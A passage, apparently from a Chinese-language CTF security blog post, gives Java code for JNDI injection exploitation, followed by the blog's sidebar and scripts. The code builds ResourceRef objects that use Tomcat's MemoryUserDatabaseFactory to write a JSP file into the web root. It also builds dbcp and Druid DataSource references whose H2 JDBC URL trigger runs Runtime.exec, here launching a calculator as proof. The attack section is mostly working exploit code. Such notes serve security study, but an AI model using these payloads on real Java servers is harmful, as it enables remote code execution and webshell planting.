+<p>再让 JNDI 返回这个 ResourceRef 对象就可以把 test.jsp 写入到 web 目录。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static ResourceRef tomcatWriteFile() &#123;     ResourceRef ref = new ResourceRef(&quot;org.apache.catalina.UserDatabase&quot;, null, &quot;&quot;, &quot;&quot;,             true, &quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;, null);     ref.add(new StringRefAddr(&quot;pathname&quot;, &quot;http://127.0.0.1:8888/../../webapps/ROOT/test.jsp&quot;));     ref.add(new StringRefAddr(&quot;readonly&quot;, &quot;false&quot;));     return ref; &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="JDBC-RCE">JDBC RCE</h2>
+<h3 id="dbcp">dbcp</h3>
+<p>dbcp分为dbcp1和dbcp2，同时又分为 commons-dbcp 和 Tomcat 自带的 dbcp。</p>
+<p>进入 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory#configureDataSource</code>方法最后一段代码写了当 InitialSize &gt; 0 的时候会调用 getLogWriter 方法</p>
+<p><code>public PrintWriter getLogWriter() throws SQLException &#123;     return this.createDataSource().getLogWriter(); &#125;</code></p>
+<p>getLogWriter 会先调用 <code>createDataSource()</code> 也就是创建数据库连接。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static Reference tomcat_dbcp2_RCE()&#123;</span><br><span class="line">    return dbcpByFactory(&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory&quot;);</span><br><span class="line">&#125;</span><br><span class="line">private static Reference tomcat_dbcp1_RCE()&#123;</span><br><span class="line">    return dbcpByFactory(&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory&quot;);</span><br><span class="line">&#125;</span><br><span class="line">private static Reference commons_dbcp2_RCE()&#123;</span><br><span class="line">    return dbcpByFactory(&quot;org.apache.commons.dbcp2.BasicDataSourceFactory&quot;);</span><br><span class="line">&#125;</span><br><span class="line">private static Reference commons_dbcp1_RCE()&#123;</span><br><span class="line">    return dbcpByFactory(&quot;org.apache.commons.dbcp.BasicDataSourceFactory&quot;);</span><br><span class="line">&#125;</span><br><span class="line">private static Reference dbcpByFactory(String factory)&#123;</span><br><span class="line">    Reference ref = new Reference(&quot;javax.sql.DataSource&quot;,factory,null);</span><br><span class="line">    String JDBC_URL = &quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot; +</span><br><span class="line">            &quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot; +</span><br><span class="line">            &quot;java.lang.Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)\n&quot; +</span><br><span class="line">            &quot;$$\n&quot;;</span><br><span class="line">    ref.add(new StringRefAddr(&quot;driverClassName&quot;,&quot;org.h2.Driver&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;url&quot;,JDBC_URL));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;username&quot;,&quot;root&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;password&quot;,&quot;password&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;initialSize&quot;,&quot;1&quot;));</span><br><span class="line">    return ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="druid">druid</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static Reference druid()&#123;</span><br><span class="line">    Reference ref = new Reference(&quot;javax.sql.DataSource&quot;,&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;,null);</span><br><span class="line">    String JDBC_URL = &quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot; +</span><br><span class="line">            &quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot; +</span><br><span class="line">            &quot;java.lang.Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)\n&quot; +</span><br><span class="line">            &quot;$$\n&quot;;</span><br><span class="line">    String JDBC_USER = &quot;root&quot;;</span><br><span class="line">    String JDBC_PASSWORD = &quot;password&quot;;</span><br><span class="line"></span><br><span class="line">    ref.add(new StringRefAddr(&quot;driverClassName&quot;,&quot;org.h2.Driver&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;url&quot;,JDBC_URL));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;username&quot;,JDBC_USER));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;password&quot;,JDBC_PASSWORD));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;initialSize&quot;,&quot;1&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;init&quot;,&quot;true&quot;));</span><br><span class="line">    return ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>能用,但是不知道为什么</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/7.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/02/ctf/java/JNDI/LDAP/" title=""><img class="cover" src="/img/7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2024/04/29/Writeups/WannaGameChampionship/2023/Art_galery/" title=""><img class="cover" src="/img/2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/18.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">dionysus</div><div class="author-info__description">我醉欲眠卿且去</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">303</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MoonlitSyntax"><i class="fab fa-github"></i><span>此心安处</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/img/wechat.png" target="_blank" title="微信"><i class="iconfont  icon-weixin"></i></a><a class="social-icon" href="https://res.abeim.cn/api/qq/?qq=1475856026" target="_blank" title="QQ"><i class="iconfont icon-QQ"></i></a><a class="social-icon" href="https://space.bilibili.com/430091327?spm_id_from=333.1007.0.0" target="_blank" title="bilibili"><i class="iconfont icon-bilibili"></i></a><a class="social-icon" href="mailto:1475856026@qq.com" target="_blank" title="QQ邮箱"><i class="iconfont icon-youxiang"></i></a><a class="social-icon" href="https://chat.openai.com" target="_blank" title="chatgpt"><i class="iconfont icon-ai"></i></a><a class="social-icon" href="https://www.luogu.com.cn" target="_blank" title="洛谷"><i class="iconfont icon-code"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><a class="faa-parent animated-hover"><svg class="faa-tada icon" style="height:25px;width:25px;fill:currentColor;position:relative;top:5px" aria-hidden="true"><use xlink:href="#icon-pinglun-1"></use></svg></a><span>公告</span></div><div class="announcement_content"><script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script> <div id="poem_sentence"></div> <div id="poem_info"></div> <script type="text/javascript">
+  jinrishici.load(function(result) {
+    var sentence = document.querySelector("#poem_sentence")
+    var info = document.querySelector("#poem_info")
+
+    var content = result.data.origin.content;
+
+    // 分割诗句为数组
+    var splitContent = [];
+    content.forEach(line => {
+        var phrases = line.split(/([。，])/);
+        for (var i = 0; i < phrases.length; i += 2) {
+            var phrase = phrases[i];
+            if (i + 1 < phrases.length) {
+                phrase += phrases[i + 1];
+            }
+            splitContent.push(phrase);
+        }
+    });
+
+    // 构建新的诗句
+    var newContent = "";
+    var line = "";
+    for (var i = 0; i < splitContent.length; i++) {
+        if (line.length + splitContent[i].length <= 15) {
+            line += splitContent[i];
+        } else {
+            newContent += line + '<br>';
+            line = splitContent[i];
+        }
+    }
+    newContent += line;
+
+    sentence.innerHTML = newContent;
+    info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》';
+  });
+</script>
+</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%8E%A2"><span class="toc-number">1.</span> <span class="toc-text">初探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EBeanFactory"><span class="toc-number">1.1.</span> <span class="toc-text">基于BeanFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#javax-management-loading-MLet"><span class="toc-number">1.2.</span> <span class="toc-text">javax.management.loading.MLet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GroovyClassLoader"><span class="toc-number">1.3.</span> <span class="toc-text">GroovyClassLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SnakeYaml"><span class="toc-number">1.4.</span> <span class="toc-text">SnakeYaml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XStream"><span class="toc-number">1.5.</span> <span class="toc-text">XStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MVEL"><span class="toc-number">1.6.</span> <span class="toc-text">MVEL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NativeLibLoader"><span class="toc-number">1.7.</span> <span class="toc-text">NativeLibLoader</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE-RCE"><span class="toc-number">2.</span> <span class="toc-text">XXE &amp; RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rce"><span class="toc-number">2.1.</span> <span class="toc-text">rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BATomcat%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">2.2.</span> <span class="toc-text">创建Tomcat管理员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell"><span class="toc-number">2.3.</span> <span class="toc-text">webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDBC-RCE"><span class="toc-number">3.</span> <span class="toc-text">JDBC RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dbcp"><span class="toc-number">3.1.</span> <span class="toc-text">dbcp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#druid"><span class="toc-number">3.2.</span> <span class="toc-text">druid</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/ctf/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%B8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cc1-cc7/" title="复习一下反序列化 cc1-cc7"><img src="/img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="复习一下反序列化 cc1-cc7"/></a><div class="content"><a class="title" href="/2024/06/07/ctf/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%B8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cc1-cc7/" title="复习一下反序列化 cc1-cc7">复习一下反序列化 cc1-cc7</a><time datetime="2024-06-07T15:27:00.000Z" title="发表于 2024-06-07 23:27:00">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/ctf/java/Fastjson/" title="Fastjson"><img src="/img/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Fastjson"/></a><div class="content"><a class="title" href="/2024/06/07/ctf/java/Fastjson/" title="Fastjson">Fastjson</a><time datetime="2024-06-07T15:26:21.000Z" title="发表于 2024-06-07 23:26:21">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/IT%E6%97%A5%E5%B8%B8/hexo%E9%AD%94%E6%94%B9/" title="hexo魔改"><img src="/img/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo魔改"/></a><div class="content"><a class="title" href="/2024/06/07/IT%E6%97%A5%E5%B8%B8/hexo%E9%AD%94%E6%94%B9/" title="hexo魔改">hexo魔改</a><time datetime="2024-06-07T15:21:11.000Z" title="发表于 2024-06-07 23:21:11">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/ctf/python/%E5%86%85%E5%AD%98%E9%A9%AC/" title="无题"><img src="/img/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2024/06/07/ctf/python/%E5%86%85%E5%AD%98%E9%A9%AC/" title="无题">无题</a><time datetime="2024-06-07T15:14:08.002Z" title="发表于 2024-06-07 23:14:08">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/Writeups/HITCON/login%20system/" title="login system"><img src="/img/23.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="login system"/></a><div class="content"><a class="title" href="/2024/06/07/Writeups/HITCON/login%20system/" title="login system">login system</a><time datetime="2024-06-07T13:37:43.000Z" title="发表于 2024-06-07 21:37:43">2024-06-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By dionysus</div><div class="footer_custom_text">此心安处是吾乡</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><canvas id="snow"></canvas><script async src="/js/snow.js"></script><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><script async data-pjax src="/js/randombg.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><!-- hexo injector body_end end --></body></html>
